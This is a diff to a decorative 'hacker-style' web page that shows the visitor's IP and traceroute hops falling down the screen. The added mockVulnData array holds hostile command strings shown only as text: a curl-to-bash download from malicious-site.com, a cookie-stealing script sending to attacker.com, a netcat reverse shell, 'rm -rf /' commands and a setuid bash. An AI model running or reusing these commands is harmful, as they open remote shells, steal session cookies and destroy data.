@@ -8,7 +8,7 @@
         body {
             margin: 0;
             font-family: 'Courier New', Courier, monospace;
-            background-color: #000;
+            background-color: #000; /* Black background */
             overflow: hidden;
         }
         .info-stream {
@@ -31,17 +31,22 @@
             opacity: 0;
         }
         .info-stream .real-info {
-            color: #add8e6;
+            color: #0dcaf0;
             font-weight: bold;
             opacity: 1 !important;
         }
         .info-stream .hop-info {
-            color: #ff4500; /* Orange for traceroute hops */
+            color: #007bff; /* Blue for traceroute hops */
             font-weight: bold;
             opacity: 1 !important;
         }
         .info-stream .hex-info {
-            color: rgba(0, 255, 255, 0.8);
+            color: rgba(0, 191, 255, 0.8);
+        }
+        .info-stream .vuln-code {
+            color: #004085; /* Dark blue for vulnerability code */
+            font-style: italic;
+            font-weight: bold;
         }
         @keyframes fall {
             0% {
@@ -62,7 +67,7 @@
             left: 50%;
             transform: translate(-50%, -50%);
             text-align: center;
-            color: #00ffff;
+            color: #00bfff;
         }
         .center-text img {
             width: 150px;
@@ -71,6 +76,14 @@
         .center-text p {
             font-size: 1.5em;
             margin-top: 10px;
+        }
+        footer {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            color: white; /* White text for footer */
+            font-size: 12px;
+            padding: 10px;
         }
     </style>
 </head>
@@ -86,6 +99,18 @@
     <script>
         async function displayUserInfo() {
             const infoStream = document.getElementById('info-stream');
+
+            const mockVulnData = [
+                "SELECT * FROM users WHERE username='admin' -- SQL Injection",
+                "curl http://malicious-site.com -o exploit.sh | bash",
+                "&lt;script&gt;document.location='http://attacker.com?cookie='+document.cookie&lt;/script&gt;",
+                "chmod +s /bin/bash",
+                "sudo rm -rf / --no-preserve-root",
+                "GET /etc/passwd HTTP/1.1",
+                "nc -e /bin/bash attacker.com 4444",
+                "openssl req -new -key /etc/ssl/private/key.pem",
+                "import os; os.system('rm -rf /')"
+            ];
 
             async function getUserInfo() {
                 try {
@@ -136,10 +161,11 @@
 
             async function getTracerouteData(ip) {
                 try {
-                    const response = await fetch(`https://api.allorigins.win/get?url=` + encodeURIComponent(`https://traceroute.tools/api/v1/trace?host=${ip}`));
-                    const responseData = await response.json();
-                    const tracerouteOutput = JSON.parse(responseData.contents).hops;
-                    return tracerouteOutput.map((hop, index) => `Hop ${index + 1}: ${hop.ip || 'Unknown'} - ${hop.rtt || 'N/A'}ms`).filter(line => line.trim().length > 0);
+                    console.log('Performing traceroute for IP:', ip);
+                    const response = await fetch(`https://api.hackertarget.com/mtr/?q=${ip}`);
+                    const tracerouteOutput = await response.text();
+                    const lines = tracerouteOutput.split('\n');
+                    return lines.slice(1, lines.length - 1).map((line, index) => `Hop ${index + 1}: ${line}`).filter(line => line.trim().length > 0);
                 } catch (error) {
                     console.error('Error fetching traceroute data:', error);
                     return ['Error retrieving traceroute data'];
@@ -155,12 +181,24 @@
 
                 infoArray.forEach((info, index) => {
                     const isHop = info.startsWith('Hop');
+                    const isVulnCode = Math.random() < 0.3; // 30% chance for vulnerability code
+                    const isHex = Math.random() < 0.5; // 50% chance for hex data
                     const div = document.createElement('div');
-                    div.className = isHop ? 'hop-info' : info.includes('IP Address') || info.includes('City') ? 'real-info' : 'hex-info';
+
+                    if (isVulnCode) {
+                        div.className = 'vuln-code';
+                        div.textContent = mockVulnData[Math.floor(Math.random() * mockVulnData.length)];
+                    } else if (isHex) {
+                        div.className = 'hex-info';
+                        div.textContent = generateHex();
+                    } else {
+                        div.className = isHop ? 'hop-info' : 'real-info';
+                        div.textContent = info;
+                    }
+
                     div.style.left = `${Math.random() * 100}%`;
                     div.style.animationDuration = `${10}s`;
                     div.style.animationDelay = `${Math.random() * 1.5}s`;
-                    div.textContent = info;
                     infoStream.appendChild(div);
                 });
             }
